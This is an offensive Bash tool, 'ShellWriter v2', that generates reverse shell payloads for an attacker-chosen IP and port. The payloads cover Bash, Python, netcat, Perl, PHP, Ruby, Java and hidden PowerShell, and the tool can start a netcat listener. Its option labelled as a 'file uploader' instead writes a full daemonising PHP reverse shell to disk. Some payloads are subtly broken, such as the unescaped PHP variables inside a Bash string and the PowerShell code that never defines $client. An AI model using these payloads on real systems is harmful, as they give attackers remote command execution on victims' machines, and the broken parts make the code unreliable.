#!/bin/bash

RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
RESET="\e[0m"

LHOST=""
LPORT=""
START_LISTENER=false


validate_ip() {
    local ip=$1
    if [[ $ip =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
        IFS='.' read -r -a octets <<< "$ip"
        for octet in "${octets[@]}"; do
            if (( octet < 0 || octet > 255 )); then
                echo -e "${RED}❌ Invalid IP address: $ip${RESET}" >&2
                exit 1
            fi
        done
        return 0
    else
        echo -e "${RED}❌ Invalid IP address format: $ip${RESET}" >&2
        exit 1
    fi
}

validate_port() {
    local port=$1
    if [[ ! $port =~ ^[0-9]+$ ]] || (( port < 1 || port > 65535 )); then
        echo -e "${RED}❌ Invalid port number: $port${RESET}" >&2
        exit 1
    fi
}


show_help() {
    if command -v figlet &> /dev/null; then
        figlet shellwriter
    else
        echo -e "${BLUE}===================${RESET}"
        echo -e "${YELLOW}   ShellWriter v2${RESET}"
        echo -e "${BLUE}===================${RESET}"
    fi
    echo -e "${YELLOW} by oxsh0gunX ${RESET}"
    echo ""
    echo -e "${GREEN}A simple tool to generate reverse shell payloads.${RESET}"
    echo ""
    echo -e "${GREEN}Usage:${RESET}"
    echo "  shellwriter [OPTIONS]"
    echo ""
    echo -e "${GREEN}Options:${RESET}"
    echo "  -i <IP>      Specify the LHOST (Listening IP)"
    echo "  -p <PORT>    Specify the LPORT (Listening Port)"
    echo "  -t           Automatically use 'tun0' interface IP for LHOST"
    echo "  -l           Start a 'netcat' listener on the specified IP and Port"
    echo "  -h           Show this help message"
    echo ""
    echo -e "${GREEN}Example:${RESET}"
    echo "  shellwriter -i 10.10.10.5 -p 4444 -l"
    echo "  shellwriter -t -p 9001 -l"
    exit 0
}

start_listener() {
    if ! command -v nc &> /dev/null; then
        echo -e "${RED}❌ 'netcat' (nc) is not installed. Cannot start listener.${RESET}" >&2
        exit 1
    fi
    echo -e "${GREEN}🚀 Starting netcat listener on $LHOST:$LPORT...${RESET}"
    nc -lvnp "$LPORT"
    echo -e "${YELLOW}⚠️ Listener terminated.${RESET}"
}


if ! command -v nc &> /dev/null; then
    echo -e "${YELLOW}⚠️ Warning: 'netcat' (nc) is not installed. The listener (-l) and netcat payload ('f') will not work.${RESET}" >&2
fi

while getopts ":i:p:lth" opt; do
  case $opt in
    i) LHOST=$OPTARG ;;
    p) LPORT=$OPTARG ;;
    l) START_LISTENER=true ;;
    t)
       echo -e "${YELLOW}Attempting to find tun0 IP...${RESET}"
       LHOST=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
       if [[ -z "$LHOST" ]]; then
           echo -e "${RED}❌ Could not automatically find IP for 'tun0'.${RESET}" >&2
           echo -e "${RED}Please check if 'tun0' is up or specify IP manually with -i <IP>${RESET}" >&2
           exit 1
       else
           echo -e "${GREEN}✅ Found tun0 IP: $LHOST${RESET}"
       fi
       ;;
    h) show_help ;;
    \?) echo -e "${RED}❌ Invalid option: -$OPTARG${RESET}" >&2; show_help ;;
    :) echo -e "${RED}❌ Option -$OPTARG requires an argument.${RESET}" >&2; show_help ;;
  esac
done

if [ $OPTIND -eq 1 ]; then
    show_help
fi

if [[ -z "$LHOST" ]]; then
    read -p "Enter LHOST (IP): " LHOST
fi

if [[ -z "$LPORT" ]]; then
    read -p "Enter LPORT (Port): " LPORT
fi

echo -e "${YELLOW}⚠️  Validating IP and Port...${RESET}"
validate_ip "$LHOST"
validate_port "$LPORT"
echo -e "${GREEN}✅ IP and Port are valid: $LHOST:$LPORT${RESET}"

echo -e "${BLUE}Choose a payload type:${RESET}"
echo "  a) Bash"
echo "  s) Python 2"
echo "  d) Python 3"
echo "  f) Netcat (Traditional)"
echo "  g) Perl"
echo "  h) PHP (Exec)"
echo "  j) Ruby"
echo "  k) Java"
echo "  l) PowerShell"
echo "  u) Simple PHP File Uploader"
echo ""

read -p "Select an option: " choice

case $choice in
    a) # Bash
        payload="bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
        ;;
    s) # Python 2
        payload="python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"$LHOST\",$LPORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        ;;
    d) # Python 3
        payload="python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"$LHOST\",$LPORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        ;;
    f) # Netcat
        payload="nc -e /bin/sh $LHOST $LPORT"
        ;;
    g) # Perl
        payload="perl -e 'use Socket;\$i=\"$LHOST\";\$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
        ;;
    h) # PHP
        payload="php -r '\$sock=fsockopen(\"$LHOST\",$LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        ;;
    j) # Ruby
        payload="ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$LHOST\",\"$LPORT\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
        ;;
    k) # Java
        payload="r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$LHOST/$LPORT;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[]);p.waitFor();"
        ;;
    l) # PowerShell
        payload="powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$LHOST\",$LPORT);\$stream = \$client.GetStream();[byte[]] \$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String); \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> '; \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2); \$stream.Write(\$sendbyte,0,\$sendbyte.Length); \$stream.Flush()};\$client.Close()"
        ;;
    u) # PHP Upload Shell
        payload="<?php




set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
"
        ;;
    *) 
        echo -e "${RED}❌ Invalid choice!${RESET}"
        exit 1
        ;;
esac

echo -e "${GREEN}✅ Payload Generated:${RESET}"
echo -e "${YELLOW}$payload${RESET}"

if [[ $choice == "u" ]]; then
    echo "$payload" > uploader.php
    echo -e "${GREEN}📂 File saved as: uploader.php${RESET}"
fi

if [ "$START_LISTENER" = true ]; then
    echo ""
    start_listener
fi
# ENJOY 

